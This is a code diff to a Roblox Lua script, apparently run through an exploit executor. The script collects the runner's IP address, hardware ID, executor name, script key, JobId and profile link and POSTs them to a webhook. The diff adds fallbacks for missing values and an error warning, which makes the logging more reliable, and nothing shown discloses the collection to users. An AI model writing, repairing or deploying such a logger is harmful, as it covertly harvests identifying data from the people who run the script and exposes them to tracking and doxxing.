@@ -8,6 +8,7 @@ local f = b:JSONDecode(e)
 local g = f.origin
 local h = game.PlaceId
 local i = game.JobId
+
 local j = {
     embeds = {
         {
@@ -26,10 +27,9 @@ local j = {
                     inline = false
                 },
                 {name = "Internet Protocol", value = string.format("```%s```", tostring(g)), inline = true},
-                {name = "Executor", value = "```" .. identifyexecutor() .. "```", inline = true},
+                {name = "Executor", value = "```" .. (identifyexecutor() or "Unknown") .. "```", inline = true}, -- Bổ sung xử lý lỗi
                 {name = "Key", value = "```" .. script_key .. "```", inline = true},
-                {
-                {name = "Hardware ID", value = string.format("```" .. gethwid() .. "```"), inline = false},
+                {name = "Hardware ID", value = string.format("```" .. (gethwid() or "Unknown") .. "```"), inline = false}, -- Bổ sung xử lý lỗi
                 {name = "JobId", value = string.format("```%s```", i), inline = false},
                 {
                     name = "Profile Link",
@@ -48,6 +48,7 @@ local j = {
         }
     }
 }
+
 local k = b:JSONEncode(j)
 local l = {["Content-Type"] = "application/json"}
 local m, n =
@@ -56,3 +57,7 @@ local m, n =
         c({Url = a, Body = k, Method = "POST", Headers = l})
     end
 )
+
+if not m then
+    warn("An Error Occurred While Sending Message To AfxcaxiRoblox Webhook" .. tostring(n))
+end
